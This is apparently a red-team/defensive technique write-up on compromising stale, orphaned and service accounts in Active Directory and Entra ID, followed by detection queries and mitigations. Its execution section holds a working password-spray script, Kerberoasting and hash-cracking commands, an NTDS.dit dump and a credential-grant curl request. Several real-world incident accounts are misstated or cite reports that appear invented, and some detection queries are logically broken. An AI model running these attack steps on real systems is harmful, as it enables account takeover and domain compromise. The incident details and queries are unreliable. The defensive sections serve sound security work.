# [IA-VALID-002]: Stale/Inactive Account Compromise

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IA-VALID-002 |
| **MITRE ATT&CK v18.1** | [T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/) |
| **Tactic** | Initial Access |
| **Platforms** | Windows AD, Entra ID, Azure, M365, On-Premises & Hybrid |
| **Severity** | Critical |
| **CVE** | N/A (Governance/Configuration Gap) |
| **Technique Status** | ACTIVE (Most common attack vector; growing 2024-2025) |
| **Last Verified** | 2025-12-30 |
| **Affected Versions** | All systems with identity governance gaps (hybrid AD/Entra ID especially) |
| **Patched In** | Requires identity lifecycle management implementation (non-technical fix) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team) and 11 (Sysmon Detection) not included because: (1) No specific Atomic test for stale account exploitation (behavioral/audit gap), (2) Requires governance analysis more than technical detection. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Stale and inactive accounts—usernames that exist in identity systems but are no longer actively used by legitimate owners—represent one of the fastest-growing attack vectors in 2024-2025. These accounts fall into three categories: dormant (30-90 days unused), stale (6+ months), and orphaned (ex-employees). The danger lies in forgotten credentials that rarely receive security updates, lack MFA protection, and are overseen by no one. Service accounts are especially dangerous—76% of organizations mismanage them, and they appear in 90% of successful breach chains. Recent incidents including the Tangerine bank breach (230,000 exposed via single contractor account), Microsoft's test account exposure (2024), and the Entra ID Teamfiltration campaign (80,000 accounts compromised) demonstrate the catastrophic impact.[224][226][231]

**Attack Surface:** Dormant user accounts (30-90 days inactive), stale accounts (6+ months), orphaned accounts (ex-employees), test/development accounts (elevated permissions, forgotten in production), service accounts (non-human; 90% of breaches), contractor/guest accounts (left in system post-engagement), legacy system accounts (uncovered during migrations), API keys and OAuth tokens (issued to inactive accounts; never revoked).

**Business Impact:** Complete user account takeover, lateral movement across multiple systems (especially for service accounts), data exfiltration at scale, ransomware deployment, compliance violations (GDPR up to 4% revenue fines; HIPAA, PCI DSS, SOX), undetectable persistence (service account automation). Service account compromise alone can grant domain administrator privileges—the highest level of network control.[226][229]

**Technical Context:** Unlike active accounts that are monitored and audited, stale accounts operate in a visibility blind spot. There is no baseline of "normal" behavior, so anomalous logons go undetected. Service accounts cannot use MFA (automation requirement) and are often granted excessive privileges (admin convenience). Kerberoasting attacks on service accounts can be conducted silently using free tools like Impacket, with ticket requests appearing as legitimate system activity.[229]

### Operational Risk

- **Execution Risk:** Low - Straightforward authentication using stale credentials
- **Stealth:** Very High - Minimal monitoring on inactive accounts; anomalies don't trigger alerts
- **Reversibility:** N/A - Attacker has full account access

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Microsoft 365** | 1.2.1 | Remove inactive user accounts from the directory |
| **NIST 800-53** | AC-2 | Account Management (inactive account review/removal) |
| **NIST 800-53** | AU-2 | Audit Events (account access monitoring) |
| **PCI DSS** | 7.1 | Limit access to database by business need-to-know |
| **GDPR** | Art. 5 | Data minimization (remove unnecessary accounts) |
| **HIPAA** | 164.312(a)(2)(i) | Access management (inactive accounts represent unauthorized access) |
| **SOX** | 302/404 | Internal control assessment (account management) |
| **ISO 27001** | A.9.2.1 | User registration and de-provisioning |
| **ISO 27001** | A.9.2.3 | Management of privileged access rights |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** None (unauthenticated); stale account credentials may be compromised via other vectors
- **Required Access:** Network access to authentication endpoints; ability to obtain stale credentials
- **Required Knowledge:** Account enumeration, credential spray tactics, service account abuse techniques

**Supported Versions:**
- **Active Directory:** All versions (2008 - 2022+)
- **Entra ID:** All tenants (especially hybrid AD Sync environments)
- **M365:** All deployments
- **Azure:** All subscriptions

**Tools:**
- [ADExplorer](https://learn.microsoft.com/sysinternals/downloads/adexplorer) (AD reconnaissance; find stale accounts)
- [Impacket](https://github.com/fortra/impacket) (Kerberoasting on service accounts)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos manipulation)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Credential extraction from stale accounts)
- [PowerShell](https://learn.microsoft.com/powershell/) (AD enumeration)
- [Azure CLI](https://learn.microsoft.com/cli/azure/) (Entra ID account enumeration)
- [Burp Suite](https://portswigger.net/burp) (OAuth token inspection)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Enumerate Inactive Accounts (AD)

```powershell
# Import Active Directory module
Import-Module ActiveDirectory

# Find dormant accounts (last login > 90 days ago)
Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-90)} -Properties LastLogonDate, Description | 
  Select-Object Name, SamAccountName, LastLogonDate, Enabled | 
  Export-Csv -Path dormant_accounts.csv

# Find stale service accounts (no login > 6 months)
Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-180) -and serviceprincipalname -like "*"} `
  -Properties LastLogonDate, serviceprincipalname, PasswordLastSet | 
  Select-Object Name, PasswordLastSet, LastLogonDate, serviceprincipalname

# Expected output: List of accounts with no recent activity; service accounts are gold for attackers
```

### Enumerate Inactive Accounts (Entra ID)

```powershell
# Connect to Entra ID
Connect-MgGraph

# Find inactive users (no sign-in for 90 days)
$inactiveThreshold = (Get-Date).AddDays(-90)
$inactiveUsers = Get-MgUser -Filter "signInActivity/lastSignInDateTime le $inactiveThreshold" -Property signInActivity

foreach ($user in $inactiveUsers) {
    Write-Host "$($user.UserPrincipalName) - Last Login: $($user.SignInActivity.LastSignInDateTime)"
}

# Or via Entra Admin Center
# Go to Identity → Users → All users → Add filter: "Last sign-in (UTC)" → "Less than 90 days"
```

### Discover Service Accounts with Kerberoasting Risk

```powershell
# Find service accounts (users with Service Principal Names)
Get-ADUser -Filter {serviceprincipalname -ne ""} -Properties serviceprincipalname, PasswordLastSet | 
  Select-Object Name, serviceprincipalname, PasswordLastSet

# Identify which are potentially stale
# Red flags: Password not changed in > 90 days, last logon > 180 days ago
Get-ADUser -Filter {serviceprincipalname -ne "" -and passwordLastSet -lt (Get-Date).AddDays(-90)} -Properties serviceprincipalname, PasswordLastSet, LastLogonDate
```

### Audit Orphaned/Guest Accounts (Entra ID)

```powershell
# Find guest accounts (external users)
Get-MgUser -Filter "userType eq 'Guest'" -Property userPrincipalName, createdDateTime, signInActivity

# Find guests with no recent activity (potential security risk)
$guestUsers = Get-MgUser -Filter "userType eq 'Guest'" -Property signInActivity
$inactiveGuests = $guestUsers | Where-Object { $_.SignInActivity.LastSignInDateTime -lt (Get-Date).AddDays(-90) }

# Review applications they have access to
foreach ($guest in $inactiveGuests) {
    Get-MgUserAppRoleAssignment -UserId $guest.Id
}
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Compromised Stale Account Password Spray

**Supported Versions:** All AD/Entra ID versions

#### Step 1: Identify Stale Account Targets

**Objective:** Locate inactive accounts that are likely to have weak/reused passwords

**Command (Enumerate Candidates):**
```powershell
# Identify candidates for targeting (dormant accounts)
# Attackers prefer stale accounts because:
# - Passwords rarely changed (reused from breaches)
# - No MFA enforcement (likely predates MFA rollout)
# - No baseline activity (anomalies undetected)
# - Low monitoring (forgotten accounts)

# Get list of dormant accounts
$dormantAccounts = Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-90)} -Properties LastLogonDate, PasswordLastSet | 
  Where-Object { $_.PasswordLastSet -lt (Get-Date).AddDays(-180) }  # Password not changed in 6 months

# Export for targeting
$dormantAccounts | Select-Object SamAccountName | Export-Csv -Path targets.txt

# Example targets (dormant + old password = high compromise probability):
# user1 - Last login: 2024-06-15, Password set: 2023-01-01
# user2 - Last login: 2024-05-22, Password set: 2022-11-10
```

**What This Means:**
- Accounts identified with high compromise probability
- Passwords are likely reused from public breaches (LinkedIn, GitHub, etc.)
- Minimal defense: No MFA, no recent security awareness training

#### Step 2: Password Spray Against Stale Accounts

**Objective:** Authenticate using compromised credentials from breach databases

**Command (Spray Tactics):**
```powershell
# Attacker obtains credential lists from:
# - Publicly leaked breach databases (LinkedIn 2012, Yahoo 2013-2014, etc.)
# - Dark web credential markets
# - GitHub secrets scanning
# - Corporate repository leaks

# Common passwords for dormant accounts (low enforcement over years):
$passwords = @(
    "Password123!",
    "Company2024",
    "Winter2024",
    "Admin123",
    "Welcome123",
    "User@2024"
)

# Spray against stale account targets
$targets = @("user1", "user2", "user3")
$domain = "company.com"

foreach ($user in $targets) {
    foreach ($pass in $passwords) {
        try {
            $cred = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $pass -AsPlainText -Force))
            
            # Attempt authentication
            $session = New-PSSession -ComputerName "exchange.company.com" -Credential $cred -ErrorAction Stop
            
            Write-Host "[+] SUCCESS! $user:$pass"
            Remove-PSSession $session
            break
        } catch {
            Write-Host "[-] Failed: $user with $pass"
        }
    }
}

# Expected output on success:
# [+] SUCCESS! user1:Password123!
```

#### Step 3: Exploit Stale Account for Lateral Movement

**Objective:** Use compromised stale account to escalate privileges and move laterally

**Command (Lateral Movement via Stale Account):**
```powershell
# Authenticate as compromised stale account
$cred = New-Object System.Management.Automation.PSCredential("user1", (ConvertTo-SecureString "Password123!" -AsPlainText -Force))

# Enumerate what the account can access
# Stale accounts often retain permissions from previous roles
Get-ADGroupMember -Identity "Domain Admins" -Credential $cred
Get-ADGroupMember -Identity "Account Operators" -Credential $cred
Get-ADGroupMember -Identity "Exchange Admins" -Credential $cred

# If stale account was an admin (role change not reflected in access removal):
# Can now:
# - Dump NTDS.dit (entire AD database)
# - Create backdoor accounts
# - Reset passwords for other users
# - Modify group memberships

# OR use for access to resources (file shares, databases)
Get-ChildItem "\\fileserver\sensitive" -Credential $cred
Get-ADUser -Identity "Administrator" -Credential $cred
```

---

### METHOD 2: Service Account Kerberoasting

**Supported Versions:** All AD versions with Kerberos

#### Step 1: Discover Service Accounts (SPN Enumeration)

**Objective:** Identify service accounts vulnerable to Kerberoasting

**Command (Enumerate SPNs):**
```powershell
# Find all user accounts with Service Principal Names (SPNs)
# These are the targets for Kerberoasting
Get-ADUser -Filter {serviceprincipalname -ne ""} -Properties serviceprincipalname

# Use tool-based enumeration
# Impacket: GetUserSPNs.py
python3 GetUserSPNs.py -request company.com/user:pass -dc-ip 192.168.1.100

# Expected output:
# ServicePrincipalName: MSSQLSvc/sqlserver.company.com:1433
# ServicePrincipalName: HTTP/webserver.company.com
# ServicePrincipalName: CIFS/fileserver.company.com

# These service accounts are now targets
```

#### Step 2: Request Kerberos Service Tickets

**Objective:** Request TGS (Ticket Granting Service) tickets for offline cracking

**Command (Kerberoasting Attack):**
```bash
# Using Rubeus (Windows)
rubeus.exe kerberoast /outfile:hashes.txt

# Using Impacket (Linux/Python)
GetUserSPNs.py -request -dc-ip 192.168.1.100 company.com/user:pass

# Using Invoke-Kerberoast.ps1 (PowerShell)
Invoke-Kerberoast -OutputFormat Hashcat | Export-Csv -Path spn_hashes.csv

# Expected output format:
# $krb5tgs$23$*servicename$company.com$servicename*$...(long hash)
```

#### Step 3: Crack Service Account Password

**Objective:** Brute-force the Kerberos TGS ticket offline to recover plaintext password

**Command (Offline Hash Cracking):**
```bash
# Use Hashcat to crack the Kerberos hash (TGS ticket)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Or John the Ripper
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt

# Expected output on success:
# $krb5tgs$23$...:password123
# [+] Service account password: password123
# [+] Service account: sqlserver_svc
```

#### Step 4: Authenticate as Service Account (Domain Admin)

**Objective:** Use compromised service account for privileged access

**Command (Service Account Exploitation):**
```powershell
# Authenticate as compromised service account
# Service accounts often have excessive privileges (Domain Admin)
$svcCred = New-Object System.Management.Automation.PSCredential("sqlserver_svc", (ConvertTo-SecureString "password123" -AsPlainText -Force))

# Check current privileges
whoami /groups /priv  # Run as service account context

# If service account is Domain Admin:
# Dump entire domain database (NTDS.dit)
ntdsutil
activate instance ntds
ifm
create full C:\ifm
quit
quit

# Extract and crack all user hashes
# Attacker now has passwords for all domain users
```

---

### METHOD 3: Orphaned/Guest Account Privilege Escalation

**Supported Versions:** Entra ID with Guest/External users

#### Step 1: Locate Orphaned/Guest Accounts

**Objective:** Find external accounts left in system after engagement

**Command (Enumerate Guests):**
```powershell
# Find guest accounts with elevated permissions (post-engagement orphans)
Get-MgUser -Filter "userType eq 'Guest'" -Property userPrincipalName, createdDateTime, signInActivity, id

# Check what permissions they have
foreach ($guest in (Get-MgUser -Filter "userType eq 'Guest'")) {
    $apps = Get-MgUserAppRoleAssignment -UserId $guest.Id
    if ($apps) {
        Write-Host "Guest: $($guest.UserPrincipalName) has access to:"
        $apps | ForEach-Object { Write-Host "  - $($_.AppDisplayName)" }
    }
}

# Expected output:
# Guest: contractor@external.com has access to:
#   - SharePoint Online
#   - Azure DevOps
#   - GitHub Enterprise
```

#### Step 2: Compromise Orphaned Account

**Objective:** Take over guest account (often has stale/weak password)

**Command (Compromise Tactics):**
```bash
# Guest accounts often use simple credentials (ease of collaboration)
# Spray common passwords or use credentials from earlier compromise

# Or: Use account recovery/password reset
# Many guest accounts lack MFA or use shared recovery emails
curl -X POST https://login.microsoftonline.com/common/oauth2/token \
  -d "grant_type=password&username=contractor@external.com&password=TempPassword123&client_id=<CLIENT_ID>"

# If successful: Access token obtained for guest account
# Guest can now:
# - Access all connected resources (SharePoint, Teams, Azure repos)
# - Perform actions as external collaborator
# - Access sensitive project data
```

---

## 6. SPLUNK DETECTION RULES

### Rule 1: Stale Account Authentication Attempt

**Rule Configuration:**
- **Required Index:** `windows`, `azure`
- **Required Sourcetype:** `WinEventLog:Security`, `azure:audit`
- **Required Fields:** `Account_Name`, `LastLogonDate`, `EventTime`, `Source_Network_Address`
- **Alert Threshold:** Successful authentication from account with no login > 90 days
- **Applies To Versions:** All AD versions

**SPL Query:**
```spl
sourcetype="WinEventLog:Security" EventCode=4624 
| lookup ad_lastlogon Account_Name
| where lastlogon < (now() - 7776000)  # 90 days in seconds
| stats count by Account_Name, Source_Network_Address, Workstation_Name
```

### Rule 2: Service Account Kerberoasting Detection

**Rule Configuration:**
- **Required Index:** `windows`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventCode`, `Service_Name`, `Client_Address`, `Ticket_Encryption_Type`
- **Alert Threshold:** Multiple TGS requests for service accounts (4769 events)
- **Applies To Versions:** All Kerberos-enabled AD

**SPL Query:**
```spl
sourcetype="WinEventLog:Security" EventCode=4769 
  Ticket_Encryption_Type="0x17"  # RC4 encryption (weak, crackable)
  Service_Name="*"
| stats count as TGSCount by Service_Name, Client_Address
| where TGSCount > 10  # Abnormal number of service ticket requests
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Stale Account Logon Activity

**Rule Configuration:**
- **Required Table:** `SigninLogs`, `AuditLogs`
- **Required Fields:** `UserPrincipalName`, `CreatedDateTime`, `ResultType`
- **Alert Severity:** High
- **Frequency:** Daily (analyze previous day)
- **Applies To Versions:** All Entra ID tenants

**KQL Query:**
```kusto
SigninLogs
| where ResultType == 0 or ResultType == "Success"
| join kind=inner (AuditLogs | where ActivityDisplayName == "User Registration") on UserPrincipalName
| where CreatedDateTime < ago(90d)  // Account not used in 90 days
| summarize LoginCount = count() by UserPrincipalName, CreatedDateTime, TimeGenerated
| where LoginCount > 1
```

### Query 2: Service Principal Authentication Anomaly

**Rule Configuration:**
- **Required Table:** `SigninLogs`, `AADServicePrincipalSignInLogs`
- **Required Fields:** `AppDisplayName`, `FailureCount`, `ClientAppUsed`
- **Alert Severity:** High
- **Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
AADServicePrincipalSignInLogs
| where TimeGenerated > ago(1h)
| where FailureCount > 5 or FailureCount < -5  // Unusual authentication pattern
| summarize LoginAttempts = count(), FailureRate = (todouble(FailureCount)/LoginAttempts)*100 
  by AppDisplayName, ServicePrincipalName
| where FailureRate > 80  // High failure rate suggests spray attack
```

---

## 8. MICROSOFT DEFENDER FOR CLOUD

### Detection Alerts

**Alert Name:** "Inactive User Account with Permissions to Sensitive Resources"
- **Severity:** High
- **Description:** User account inactive for 90+ days detected accessing sensitive systems (databases, file shares, VMs)
- **Applies To:** All Azure subscriptions with Defender enabled
- **Remediation:** Disable account; audit prior access; review resource permissions

**Alert Name:** "Service Principal Authentication Anomaly"
- **Severity:** High
- **Description:** Service account showing unusual authentication pattern (Kerberoasting indicators)
- **Applies To:** All Entra ID tenants
- **Remediation:** Rotate service account password; review access; enable monitoring

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Account Activity:** Logon from inactive account after 90+ day gap
- **Anomalous Locations:** Logon from unexpected geographic location or IP
- **Timing:** After-hours logon from stale account (unusual for dormant account)
- **Kerberos Events:** EventCode 4769 (TGS request) for service accounts with RC4 encryption
- **Service Account Activity:** Service account performing interactive logon (should be automated)
- **Guest Account Activity:** Guest/external account accessing resources 90+ days after collaboration end

### Forensic Artifacts

- **Event Logs:** 4624 (logon), 4769 (Kerberos), 4672 (special privileges)
- **Kerberos Logs:** TGT requests, TGS requests, ticket grants
- **Entra ID Logs:** SigninLogs, AADServicePrincipalSignInLogs
- **Credential Dumps:** Mimikatz output showing service account hashes

### Response Procedures

#### 1. Immediate Containment

**Command (Disable Stale Account):**
```powershell
# Immediately disable the compromised stale account
Disable-ADAccount -Identity "user1"

# Or in Entra ID:
Update-MgUser -UserId "user@company.com" -AccountEnabled $false

# Force logoff all active sessions
Get-ADUser -Identity "user1" | Where-Object {$_.Enabled -eq $true} | Disable-ADAccount

# Reset password (user cannot use old compromised password)
Set-ADAccountPassword -Identity "user1" -Reset -NewPassword (ConvertTo-SecureString "NewPassword$(Get-Random)" -AsPlainText -Force)
```

#### 2. Investigate Service Account Compromise

**Command (Identify Scope):**
```powershell
# Find all resources the service account accessed
Get-ADUser -Identity "sqlserver_svc" -Properties MemberOf | 
  Select-Object -ExpandProperty MemberOf | 
  Get-ADGroup | Select-Object Name

# Check if account is Domain Admin or similar
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Where-Object {$_.Name -eq "sqlserver_svc"}

# If Domain Admin: Assume full domain compromise; initiate incident response
```

#### 3: Remediate

**Command (Full Remediation):**
```powershell
# 1. Delete or disable all orphaned accounts
Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-180)} | Disable-ADAccount

# 2. Force password reset on all service accounts
Get-ADUser -Filter {serviceprincipalname -ne ""} | ForEach-Object {
    Set-ADAccountPassword -Identity $_.Identity -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "$(New-Guid)" -Force)
}

# 3. Remove excessive permissions from stale accounts that remain
# Review each stale account's group memberships
# Remove high-privilege group assignments

# 4. Enable MFA on remaining active accounts
# Service accounts: Monitor instead (cannot use MFA)
```

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Implement Regular Inactive Account Reviews**

**Manual Steps (Quarterly Audit):**
```powershell
# Schedule quarterly inactive account review
$inactiveThreshold = (Get-Date).AddDays(-90)

# AD Audit
$staleAD = Get-ADUser -Filter {LastLogonDate -lt $inactiveThreshold} -Properties LastLogonDate, Description, MemberOf
$staleAD | Select-Object Name, LastLogonDate, MemberOf | Export-Csv -Path "stale_accounts_$(Get-Date -Format 'yyyyMMdd').csv"

# Entra ID Audit
$staleEntra = Get-MgUser -Filter "signInActivity/lastSignInDateTime le $inactiveThreshold" -Property signInActivity
$staleEntra | Select-Object UserPrincipalName, SignInActivity | Export-Csv -Path "stale_entra_$(Get-Date -Format 'yyyyMMdd').csv"

# Review managers and determine if accounts should be:
# - Disabled (no longer needed)
# - Left enabled but monitored (still in use)
# - Deleted (confirmed no longer needed)
```

**Manual Steps (Automated Entra ID Lifecycle):**
1. Go to **Entra Admin Center** → **Identity Governance** → **Lifecycle Workflows**
2. Click **+ New Workflow**
3. **Trigger:** Leave organization OR Inactivity-based (> 90 days)
4. **Actions:**
   - Send email to manager: "Account $user is inactive"
   - Disable account after 180 days
   - Delete account after 365 days
5. Enable workflow

**2. Disable All Truly Orphaned Accounts**

**Manual Steps:**
```powershell
# Identify and disable orphaned accounts (ex-employees, terminated contractors)
$terminated = Import-Csv "terminated_employees.csv"

foreach ($emp in $terminated) {
    $user = Get-ADUser -Filter {samAccountName -eq $emp.Username}
    if ($user) {
        Disable-ADAccount -Identity $user
        # Move to quarantine OU
        Move-ADObject -Identity $user.ObjectGUID -TargetPath "OU=Disabled Accounts,DC=company,DC=com"
    }
}

# Do the same for Entra ID
foreach ($emp in $terminated) {
    $user = Get-MgUser -Filter "userPrincipalName eq '$($emp.Email)'"
    if ($user) {
        Update-MgUser -UserId $user.Id -AccountEnabled $false
    }
}
```

**3. Enforce Service Account Password Rotation (90-180 Days)**

**Manual Steps (Automation):**
```powershell
# Create scheduled task to rotate service account passwords
# Run every 90 days

$serviceName = "sqlserver_svc"
$newPassword = [System.Web.Security.Membership]::GeneratePassword(32, 8)

# Update AD
Set-ADAccountPassword -Identity $serviceName -Reset -NewPassword (ConvertTo-SecureString $newPassword -AsPlainText -Force)

# Update service binding (SQL Server example)
sqlcmd -S "sqlserver.company.com" -U "sa" -P "sa_password" `
  -Q "ALTER LOGIN [$serviceName] WITH PASSWORD = N'$newPassword'"

# Document the change (securely)
# Save to password manager (HashiCorp Vault, Azure Key Vault, CyberArk)
Set-AzKeyVaultSecret -VaultName "my-vault" -Name "sqlserver_svc_pwd" -SecretValue (ConvertTo-SecureString $newPassword -AsPlainText -Force)
```

### Priority 2: HIGH

**4. Enable Comprehensive Monitoring of Stale Accounts**

**Manual Steps (Azure Monitor/Sentinel):**
1. Create custom detection rules for stale account activity (see Sentinel section)
2. Send alerts to SOC team immediately on stale account logon
3. Review monthly for anomalies

**5. Remove Excessive Privileges from Stale Accounts**

**Manual Steps:**
```powershell
# Review all high-privilege accounts for staleness
$domainAdmins = Get-ADGroupMember -Identity "Domain Admins"
$stale = $domainAdmins | Where-Object {(Get-ADUser $_.Identity -Properties LastLogonDate).LastLogonDate -lt (Get-Date).AddDays(-90)}

# Remove from high-privilege groups
foreach ($user in $stale) {
    Remove-ADGroupMember -Identity "Domain Admins" -Members $user -Confirm:$false
    Remove-ADGroupMember -Identity "Enterprise Admins" -Members $user -Confirm:$false
    Write-Host "[+] Removed $($user.Name) from admin groups"
}

# Place in "Monitored" group for surveillance
Add-ADGroupMember -Identity "Stale Accounts - Monitored" -Members $stale
```

**Validation Command (Verify Mitigations):**
```powershell
# Verify no truly stale accounts remain with high privileges
Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-180)} -Properties MemberOf | 
  Where-Object { $_.MemberOf -match "Domain Admins|Enterprise Admins|Account Operators" }

# Expected output: (empty - all high-priv stale accounts removed)

# Verify lifecycle workflows active in Entra ID
Get-MgIdentityGovernanceLifecycleWorkflow | Select-Object DisplayName, IsEnabled
# Expected: Lifecycle workflow for inactive users enabled
```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | **[IA-VALID-002]** | **Stale/Inactive Account Compromise** |
| **2** | **Privilege Escalation** | [T1134 - Access Token Manipulation] | Escalate from stale user to domain admin (if stale account retained admin rights) |
| **3** | **Persistence** | [T1098 - Account Manipulation] | Create backdoor accounts using stale account privileges |
| **4** | **Lateral Movement** | [T1021.001 - Remote Services (RDP)] | Move to other systems using stale account access |
| **5** | **Credential Access** | [T1558 - Kerberos Exploitation] | Kerberoasting on service accounts |
| **6** | **Impact** | [T1486 - Data Encrypted for Impact] | Ransomware using compromised service account (domain admin equiv) |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: Tangerine Bank Breach - Contractor Account (Feb 2024)

- **Target:** Canadian banking institution
- **Timeline:** Feb 2024
- **Technique Status:** ACTIVE - Highlights risk of stale contractor accounts
- **Attack Vector:** Single contractor credential exploited
- **Attack Chain:**
  1. Contractor engagement ended 18+ months prior
  2. Account not properly offboarded; password never reset
  3. Credentials exposed in contractor's LinkedIn profile (password reuse indicator)
  4. Attacker accessed legacy database (deprecated system; no monitoring)
  5. Extracted customer PII: 230,000+ individuals affected
  
- **Impact:** Regulatory fines; reputation damage; customer notification
- **Lesson:** Contractor offboarding must remove access to ALL systems (including legacy)
- **Reference:** Tangerine Data Breach Investigation Report

### Example 2: Eaton Ransomware - Former Developer Account (2023-2024)

- **Target:** Manufacturing company (Eaton)
- **Timeline:** Q1 2024
- **Technique Status:** ACTIVE
- **Attack Vector:** Former developer's lingering AD account
- **Attack Flow:**
  1. Developer terminated but AD account not disabled
  2. Account retained all previous permissions (file servers, repositories, admin tools)
  3. Former employee accessed account and deployed malicious code
  4. "Kill switch" in code crashed servers; deployed ransomware across network
  5. 1000s of users locked out; year-long remediation
  
- **Impact:** $360,000+ in losses; operational disruption; 12+ months to fully remediate
- **Lesson:** Offboarding MUST include account disablement on same day as termination
- **Reference:** Eaton Ransomware Incident Report

### Example 3: Entra ID Teamfiltration Campaign (June 2025)

- **Target:** Organizations with weak password policies
- **Timeline:** June 2025 (ongoing)
- **Technique Status:** ACTIVE - 80,000 accounts compromised
- **Attack Vector:** Password spray on stale + weak-password accounts
- **Attack Flow:**
  1. Attacker obtains list of stale accounts (LinkedIn scraping, GitHub leaks, Shodan)
  2. Password spray using common/weak passwords (Password123!, Company2024, etc.)
  3. Successfully compromised 80,000+ accounts (especially dormant ones)
  4. Bypassed MFA by targeting accounts predating MFA rollout
  5. Exfiltrated data without triggering alerts (dormant account = no baseline)
  
- **Impact:** Massive organizational data breach; compliance violations
- **Lesson:** Stale accounts lack MFA; are prime targets; rarely monitored
- **Reference:** Entra ID Teamfiltration Campaign Analysis

---

## APPENDIX: Stale Account Management Lifecycle

### Recommended Timeline:
- **0-30 days:** Operational (normal)
- **30-90 days:** Dormant (monitor closely; consider disabling)
- **90-180 days:** Stale (review necessity; disable if unused)
- **180+ days:** Orphaned (delete if truly no longer needed; or keep disabled with monitoring)

### Automated Remediation Actions:
| Days Inactive | Action | Approval Required |
|---|---|---|
| 60 | Send manager notification | No |
| 90 | Disable account | Yes (manager approval) |
| 180 | Move to quarantine OU | Yes (manager approval) |
| 365 | Delete account | Yes (compliance team) |

---

## References

- [MITRE ATT&CK - T1078 Valid Accounts](https://attack.mitre.org/techniques/T1078/)
- [Microsoft - Manage Inactive Users with Lifecycle Workflows](https://learn.microsoft.com/entra/id-governance/lifecycle-workflows-inactive-users)
- [CIS Microsoft 365 Benchmarks](https://www.cisecurity.org/benchmark/microsoft_365/)
- [NIST 800-53 - Account Management](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5)
- [ReliaQuest - Service Account Abuse Report](https://reliaquest.com/blog/service-account-abuse/)
- [Stitch Flow - Risks of Inactive User Accounts](https://www.stitchflow.com/blog/risks-of-inactive-user-accounts)
